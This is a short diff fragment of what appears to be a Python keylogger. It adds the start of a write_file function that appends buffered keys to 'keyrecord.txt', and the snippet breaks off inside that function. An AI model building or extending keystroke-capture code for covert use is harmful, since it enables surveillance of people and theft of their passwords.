@@ -19,3 +19,6 @@ if count >= 1:
         count = 0
         write_file(keys)
         keys = []
+
+def write_file(keys):
+    with open("keyrecord.txt","a") as f:
